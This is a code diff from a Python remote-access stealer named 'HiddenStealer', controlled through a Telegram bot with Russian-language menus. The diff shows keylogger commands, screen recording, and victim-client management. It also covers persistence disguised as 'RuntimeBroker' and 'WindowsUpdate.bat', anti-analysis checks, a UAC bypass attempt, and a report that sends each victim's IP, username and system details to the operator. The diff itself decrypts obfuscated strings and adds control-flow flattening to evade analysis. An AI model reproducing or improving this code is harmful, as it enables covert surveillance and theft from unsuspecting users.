                 def set_label(m, hwid=hwid):
@@ -4259,7 +4313,7 @@ class HiddenStealer:
                 if msg_lbl:
                     bot.register_next_step_handler(msg_lbl, set_label)
 
-            elif data.startswith(decrypt_string("DV4RDiAlBhA/GgVOFwM=")):
+            elif data.startswith("client_remove:"):
                 hwid = data.split(":")[1]
                 with self.client_lock:
                     if hwid in self.clients:
@@ -4347,7 +4401,7 @@ class HiddenStealer:
         def send_file_command(message):
             user = user_db.get_user(message.from_user.id)
             if not user:
-                safe_send_message(self.bot, message.chat.id, decrypt_string("jKnsS2SBybLopujozOjmqtbiz7v2gNmz2afT6fDp06vv4/RLn9aJ14v3uo2ijkZVHUYZGTp7"))
+                safe_send_message(self.bot, message.chat.id, "⛔ *Авторизируйтесь через /start*")
                 return
             parts = message.text.split(' ', 1)
             if len(parts) < 2:
@@ -4361,7 +4415,7 @@ class HiddenStealer:
         def cmd_exit_command(message):
             user = user_db.get_user(message.from_user.id)
             if not user:
-                safe_send_message(self.bot, message.chat.id, decrypt_string("jKnsS2SBybLopujozOjmqtbiz7v2gNmz2afT6fDp06vv4/RLn9aJ14v3uo2ijkZVHUYZGTp7"))
+                safe_send_message(self.bot, message.chat.id, "⛔ *Авторизируйтесь через /start*")
                 return
             self.exit_cmd_mode(message.chat.id)
 
@@ -4369,7 +4423,7 @@ class HiddenStealer:
         def keylog_toggle_command(message):
             user = user_db.get_user(message.from_user.id)
             if not user:
-                safe_send_message(self.bot, message.chat.id, decrypt_string("jKnsS2SBybLopujozOjmqtbiz7v2gNmz2afT6fDp06vv4/RLn9aJ14v3uo2ijkZVHUYZGTp7"))
+                safe_send_message(self.bot, message.chat.id, "⛔ *Авторизируйтесь через /start*")
                 return
             if self.keylogger_active:
                 self.stop_keylogger()
@@ -4382,7 +4436,7 @@ class HiddenStealer:
         def keylog_stats_command(message):
             user = user_db.get_user(message.from_user.id)
             if not user:
-                safe_send_message(self.bot, message.chat.id, decrypt_string("jKnsS2SBybLopujozOjmqtbiz7v2gNmz2afT6fDp06vv4/RLn9aJ14v3uo2ijkZVHUYZGTp7"))
+                safe_send_message(self.bot, message.chat.id, "⛔ *Авторизируйтесь через /start*")
                 return
             stats = self.get_keylog_stats()
             safe_send_message(self.bot, message.chat.id, stats)
@@ -4391,7 +4445,7 @@ class HiddenStealer:
         def keylog_full_command(message):
             user = user_db.get_user(message.from_user.id)
             if not user:
-                safe_send_message(self.bot, message.chat.id, decrypt_string("jKnsS2SBybLopujozOjmqtbiz7v2gNmz2afT6fDp06vv4/RLn9aJ14v3uo2ijkZVHUYZGTp7"))
+                safe_send_message(self.bot, message.chat.id, "⛔ *Авторизируйтесь через /start*")
                 return
             if self.keylog_buffer or self.keylog_context:
                 self.send_advanced_keylog(full_log=True)
@@ -4402,7 +4456,7 @@ class HiddenStealer:
         def keylog_clear_command(message):
             user = user_db.get_user(message.from_user.id)
             if not user:
-                safe_send_message(self.bot, message.chat.id, decrypt_string("jKnsS2SBybLopujozOjmqtbiz7v2gNmz2afT6fDp06vv4/RLn9aJ14v3uo2ijkZVHUYZGTp7"))
+                safe_send_message(self.bot, message.chat.id, "⛔ *Авторизируйтесь через /start*")
                 return
             self.clear_keylog()
 
@@ -4410,7 +4464,7 @@ class HiddenStealer:
         def clients_command(message):
             user = user_db.get_user(message.from_user.id)
             if not user:
-                safe_send_message(self.bot, message.chat.id, decrypt_string("jKnsS2SBybLopujozOjmqtbiz7v2gNmz2afT6fDp06vv4/RLn9aJ14v3uo2ijkZVHUYZGTp7"))
+                safe_send_message(self.bot, message.chat.id, "⛔ *Авторизируйтесь через /start*")
                 return
             text = self.get_clients_list_text()
             safe_send_message(self.bot, message.chat.id, text, reply_markup=self.clients_keyboard())
@@ -4419,7 +4473,7 @@ class HiddenStealer:
         def record_screen_command(message):
             user = user_db.get_user(message.from_user.id)
             if not user:
-                safe_send_message(self.bot, message.chat.id, decrypt_string("jKnsS2SBybLopujozOjmqtbiz7v2gNmz2afT6fDp06vv4/RLn9aJ14v3uo2ijkZVHUYZGTp7"))
+                safe_send_message(self.bot, message.chat.id, "⛔ *Авторизируйтесь через /start*")
                 return
 
             try:
@@ -4433,7 +4487,7 @@ class HiddenStealer:
                     "🎥 *Запись видео {duration} сек...*\nПожалуйста, подождите.".format(duration=duration)
                 )
 
-                video_path = os.path.join(self.temp_dir, decrypt_string("HFcbBDw1BhkzGR4QBlALH0BGEQYreXBLJ1kHSEY="))
+                video_path = os.path.join(self.temp_dir, "record_{int(time.time())}.mp4")
                 self.record_screen_mp4(duration, video_path)
 
                 size = os.path.getsize(video_path)
@@ -4487,10 +4541,10 @@ class HiddenStealer:
                 return
 
         try:
-            print(decrypt_string("NRglSx0lOBAuHgRfUlsJDk5CFwciODcFegADTBoZFB8aQAFLIj42EnRZRA=="))
+            print("[*] Starting bot polling with retry loop...")
             self.bot.infinity_polling(timeout=30, long_polling_timeout=30)
         except Exception as e:
-            print(decrypt_string("NRMlSx4+NQ4zGQ0YF0sUFRwIWBArLA=="))
+            print("[!] Polling error: {e}")
 
     def get_clients_list_text(self):
         if not self.clients:
@@ -4543,10 +4597,10 @@ class HiddenStealer:
         if total_pages > 1:
             nav_row = []
             if self.clients_page > 0:
-                nav_row.append(types.InlineKeyboardButton("\u2B05\ufe0f \u041f\u0440\u0435\u0434", callback_data=decrypt_string("DV4RDiAlBhI7EA8CCUoDFggcGwcnNDcWKSgaWRVcRldOAwU=")))
-            nav_row.append(types.InlineKeyboardButton(decrypt_string("FUEdByh/Og4zEgRMAWYWGwlXWEBuYCRNIQMFTBNVOQoPVR0YMw=="), callback_data="client_list"))
+                nav_row.append(types.InlineKeyboardButton("\u2B05\ufe0f \u041f\u0440\u0435\u0434", callback_data="client_page:{self.clients_page - 1}"))
+            nav_row.append(types.InlineKeyboardButton("{self.clients_page + 1}/{total_pages}", callback_data="client_list"))
             if self.clients_page < total_pages - 1:
-                nav_row.append(types.InlineKeyboardButton("\u0421\u043b\u0435\u0434 \u27A1\ufe0f", callback_data=decrypt_string("DV4RDiAlBhI7EA8CCUoDFggcGwcnNDcWKSgaWRVcRlFOAwU=")))
+                nav_row.append(types.InlineKeyboardButton("\u0421\u043b\u0435\u0434 \u27A1\ufe0f", callback_data="client_page:{self.clients_page + 1}"))
             markup.row(*nav_row)
         markup.add(types.InlineKeyboardButton("\U0001F504 \u041e\u0431\u043d\u043e\u0432\u0438\u0442\u044c", callback_data="client_list"))
         markup.add(types.InlineKeyboardButton("\u2B05\ufe0f \u041d\u0430\u0437\u0430\u0434", callback_data="back_to_main"))
@@ -4557,12 +4611,12 @@ class HiddenStealer:
         client = self.clients.get(hwid)
         if client:
             if not is_current:
-                markup.add(types.InlineKeyboardButton("\u2705 \u041f\u0435\u0440\u0435\u043a\u043b\u044e\u0447\u0438\u0442\u044c\u0441\u044f", callback_data=decrypt_string("DV4RDiAlBhEtHh5bGgMdEhlbHBY=")))
+                markup.add(types.InlineKeyboardButton("\u2705 \u041f\u0435\u0440\u0435\u043a\u043b\u044e\u0447\u0438\u0442\u044c\u0441\u044f", callback_data="client_switch:{hwid}"))
             markup.row(
-                types.InlineKeyboardButton("\U0001F4CA \u0418\u043d\u0444\u043e", callback_data=decrypt_string("DV4RDiAlBgs0EQUCCVEREwpP")),
-                types.InlineKeyboardButton("\U0001F3F7\ufe0f \u042f\u0440\u043b\u044b\u043a", callback_data=decrypt_string("DV4RDiAlBg47FQ9USEIODQdWBQ=="))
+                types.InlineKeyboardButton("\U0001F4CA \u0418\u043d\u0444\u043e", callback_data="client_info:{hwid}"),
+                types.InlineKeyboardButton("\U0001F3F7\ufe0f \u042f\u0440\u043b\u044b\u043a", callback_data="client_label:{hwid}")
             )
-            markup.add(types.InlineKeyboardButton("\U0001F5D1\ufe0f \u0423\u0434\u0430\u043b\u0438\u0442\u044c \u0441\u0435\u0441\u0441\u0438\u044e", callback_data=decrypt_string("DV4RDiAlBhA/GgVOFwMdEhlbHBY=")))
+            markup.add(types.InlineKeyboardButton("\U0001F5D1\ufe0f \u0423\u0434\u0430\u043b\u0438\u0442\u044c \u0441\u0435\u0441\u0441\u0438\u044e", callback_data="client_remove:{hwid}"))
         markup.add(types.InlineKeyboardButton("\u25C0\ufe0f \u041d\u0430\u0437\u0430\u0434", callback_data="client_list"))
         return markup
     def switch_client(self, hwid):
@@ -4673,12 +4727,12 @@ class HiddenStealer:
             
             # 1. Параметры
             bot_name = "RuntimeBroker" + ''.join(random.choices(string.digits, k=2))
-            appdata = os.environ.get('APPDATA', os.path.expanduser(decrypt_string('EG4kKj4hHQMuFjZkIFYHFwdcHw==')))
+            appdata = os.environ.get('APPDATA', os.path.expanduser("~\\\\AppData\\\\Roaming"))
             dest_dir = os.path.join(appdata, 'Microsoft', 'Windows')
             os.makedirs(dest_dir, exist_ok=True)
             
             exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
-            dest_path = os.path.join(dest_dir, decrypt_string("FVAXHxE/OA8/CkRdClw="))
+            dest_path = os.path.join(dest_dir, f"{bot_name}.exe")
             
             # 2. Копирование и скрытие
             if not os.path.exists(dest_path):
@@ -4688,25 +4742,30 @@ class HiddenStealer:
                 except Exception as e:
                     # If file exists and is locked, we can't overwrite it, but that's fine if it's already there
                     if not os.path.exists(dest_path):
-                        log_debug(decrypt_string("PlcKGCciLQc0FA8YEVYWA05XChkhI3lKPhIZTFJJBw4GEhUCPSIwDD1XC1YWGQUVHktYDS84NQc+XlAYCVwb"))
+                        log_debug("Persistence copy error (dest path missing and copy failed): {e}")
                     else:
-                        log_debug(decrypt_string("PlcKGCciLQc0FA8YEVYWA05BEwI+ITwGel8MUR5cRhYHWR0HN3E1DTkcD1xdSxMUAFsWDGdreRk/Cg=="))
+                        log_debug("Persistence copy skipped (file likely locked/running): {e}")
             elif os.path.getsize(exe_path) != os.path.getsize(dest_path):
                 # Try to overwrite only if sizes differ
                 try:
                     shutil.copy2(exe_path, dest_path)
                 except:
-                    log_debug(decrypt_string("PlcKGCciLQc0FA8CUnoJDwJWWAUhJXkXKhMLTBcZAwIHQQwCIDZ5BDMbDxhaVQkZBVccQg=="))
+                    log_debug("Persistence: Could not update existing file (locked)")
 
             # 3. Нативная установка через C# (A-08: Full Persistence Integration)
             try:
-                from core.persistence import PersistManager
-                pm = PersistManager()
-                pm.install_all(dest_path)
+                # Only install persistence if we are a compiled EXE
+                # Or if we want to risk it with a script (not recommended for stealth)
+                if getattr(sys, 'frozen', False):
+                    from core.persistence import PersistManager
+                    pm = PersistManager()
+                    pm.install_all(dest_path)
+                else:
+                    log_debug("Persistence: Skipping native install (running from source)")
             except Exception as e:
                 log_debug(f"❌ Persistence installation failed: {e}")
         except Exception as e:
-            log_debug(decrypt_string("PlcKGCciLQc0FA8YF0sUFRwIWBArLA=="))
+            log_debug("Persistence error: {e}")
             print("❌ Ошибка при установке автозагрузки.")
     def remove_autostart(self):
         try:
@@ -4723,7 +4782,7 @@ class HiddenStealer:
                 startup_path = os.path.join(os.getenv('APPDATA'), 
                                            'Microsoft', 'Windows', 
                                            'Start Menu', 'Programs', 'Startup')
-                bat_path = os.path.join(startup_path, decrypt_string('OVsWDyEmKjcqEwtMFxcEGxo='))
+                bat_path = os.path.join(startup_path, "WindowsUpdate.bat")
                 if os.path.exists(bat_path):
                     os.remove(bat_path)
             except:
@@ -4810,41 +4869,54 @@ del /f /q "%~f0"
         except Exception as e:
             print("❌ Ошибка при загрузке меток.")
     def send_start_report(self):
-        if not TELEGRAM_AVAILABLE:
-            return
-        if getattr(self, 'start_report_sent', False):
-            return
-        self.register_self()
-        info = self.get_system_info()
-        layout = self.get_keyboard_layout()
-        layout_text = "EN" if layout == "en" else "RU" if layout == "ru" else "UA"
-        client = self.clients.get(self.current_client_hwid)
-        pc_user = info['pc'] + "\\" + info['user']
-        if client and client.label:
-            display_title = client.label + "  |  " + pc_user
-        else:
-            display_title = pc_user
-        mic_ok = "\u2705" if self.check_microphone_availability() else "\u274C"
-        from telebot import types
-        markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton("⌨️ Открыть панель управления", callback_data="open_panel"))
-
-        text = (
-            f"🚀 <b>КЛИЕНТ ОНЛАЙН</b>\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"👤 <b>ID:</b> <code>{display_title}</code>\n"
-            f"🌐 <b>IP:</b> <code>{info.get('external_ip', 'Unknown')}</code>\n"
-            f"🖥️ <b>Система:</b> <code>{info['os']} {info['release']}</code>\n"
-            f"🎤 <b>Микрофон:</b> {mic_ok}\n"
-            f"⌚ <b>Время:</b> <code>{info['time']}</code>\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            # f"⌨️ /panel – открыть панель управления" # Removed text command in favor of button
-        )
-        try:
-            safe_send_message(self.bot, GLOBAL_CHID, text, reply_markup=markup)
-            self.start_report_sent = True
-        except:
-            pass
+        """[H-16] Control Flow Flattened Reporting"""
+        _st = 0x100
+        _info = None
+        _layout = None
+        while True:
+            if _st == 0x100:
+                if not TELEGRAM_AVAILABLE or getattr(self, "start_report_sent", False):
+                    _st = 0x500
+                else:
+                    _st = 0x200
+            elif _st == 0x200:
+                self.register_self()
+                _info = self.get_system_info()
+                _layout = self.get_keyboard_layout()
+                _st = 0x300
+            elif _st == 0x300:
+                _lt = "EN" if _layout == "en" else "RU" if _layout == "ru" else "UA"
+                _client = self.clients.get(self.current_client_hwid)
+                _pc_user = _info["pc"] + "\\" + _info["user"]
+                _title = (_client.label + "  |  " + _pc_user) if (_client and _client.label) else _pc_user
+                _mic = "\u2705" if self.check_microphone_availability() else "\u274C"
+                
+                from telebot import types
+                _markup = types.InlineKeyboardMarkup()
+                _markup.add(types.InlineKeyboardButton("⌨️ Открыть панель управления", callback_data="open_panel"))
+                
+                _text = (
+                    f"🚀 <b>КЛИЕНТ ОНЛАЙН</b>\n"
+                    f"━━━━━━━━━━━━━━━━━━\n"
+                    f"👤 <b>ID:</b> <code>{_title}</code>\n"
+                    f"🌐 <b>IP:</b> <code>{_info.get('external_ip', 'Unknown')}</code>\n"
+                    f"🖥️ <b>Система:</b> <code>{_info['os']} {_info['release']}</code>\n"
+                    f"🎤 <b>Микрофон:</b> {_mic}\n"
+                    f"⌚ <b>Время:</b> <code>{_info['time']}</code>\n"
+                    f"━━━━━━━━━━━━━━━━━━\n"
+                )
+                _st = 0x400
+            elif _st == 0x400:
+                try:
+                    safe_send_message(self.bot, GLOBAL_CHID, _text, reply_markup=_markup)
+                    self.start_report_sent = True
+                except:
+                    pass
+                _st = 0x500
+            elif _st == 0x500:
+                return
+            else:
+                break
     def process_kill_handler(self, message):
         """Обработка ввода PID для убийства процесса"""
         try:
@@ -4974,6 +5046,7 @@ def relaunch_steam():
             print("✅ Steam запущен из реестра.")
     except Exception as e:
         print("❌ Не удалось запустить Steam из реестра.")
+log_debug("Definitions finished. Entering if __name__ == '__main__'...")
 if __name__ == "__main__":
     try:
         # [A-01] PRE-FLIGHT ANTI-ANALYSIS (C# NATIVE)
@@ -4989,6 +5062,7 @@ if __name__ == "__main__":
                     print(f"[WARNING] Файл не найден: {dll_path}")
                 
                 clr.AddReference(dll_path)
+                Resolver.load_native()
                 from VanguardCore import SafetyManager
                 SafetyManager.Startup()
                 
@@ -5001,32 +5075,35 @@ if __name__ == "__main__":
                     print("[WARNING] Обнаружена эмуляция! (Продолжение работы...)")
                 
                 print("[OK] Проверка среды пройдена.")
-                # Runtime protections - disabled because they cause FailFast/Crashes on dev environment
-                # SafetyManager.HideThread()
-                # SafetyManager.AntiDump()
-                # SafetyManager.AntiBehavior()
-                # SafetyManager.ProtectSelf()
+                log_startup("SafetyManager checks passed.")
             except Exception as e:
+                log_startup(f"SafetyManager initialization error: {e}")
                 print(f"[WARNING] Ошибка при загрузке модуля защиты: {e}")
                 pass
         else:
             print("⏩ Проверка анти-анализа пропущена.")
-            log_debug("Anti-Analysis runtime checks bypassed via SKIP_ANTI_ANALYSIS")
+            log_startup("Anti-Analysis runtime checks bypassed via SKIP_ANTI_ANALYSIS")
 
         # [A-02] SINGLE INSTANCE LOCK
         print("[LOCK] Проверка единственного экземпляра...")
+        log_startup("Entering check_single_instance()...")
         check_single_instance()
+        log_startup("check_single_instance() returned.")
         
         # [A-03] PRIVILEGE ESCALATION
         if not ctypes.windll.shell32.IsUserAnAdmin() and not UAC_CHILD:
+            log_startup("UAC: Not admin and not child, attempting bypass...")
             print("⚡️ [UAC] Попытка автоматического повышения прав...")
             try_uac_bypass()
-
+        
+        log_startup("Proceeding to p2p bridge setup...")
         # [A-04] POST-ANALYSIS INITIALIZATION (must be after UAC to avoid port 4444 clash)
         print("[CONFIG] Настройка сетевых мостов...")
         setup_p2p_bridge()
+        log_startup("setup_p2p_bridge() completed.")
             
         print("--- HiddenStealer Initialized ---")
+        log_startup("Bot initialization finished. Starting run loop.")
 
         def signal_handler(sig, frame):
             import signal
@@ -5042,9 +5119,14 @@ if __name__ == "__main__":
 
         import signal
         signal.signal(signal.SIGINT, signal_handler)
-        main_bot = HiddenStealer()
-        main_bot.run()
     except Exception as e:
+        import traceback
+        import time
+        err_msg = f"CRITICAL STARTUP ERROR: {e}\n{traceback.format_exc()}"
+        log_startup(err_msg)
+        print(f"\n[ERROR] CRITICAL:\n{err_msg}")
+        print("\nWindow will close in 60 seconds...")
+        time.sleep(60)
         print("[ERROR] Критическая ошибка при запуске:")
         import traceback
         traceback.print_exc()
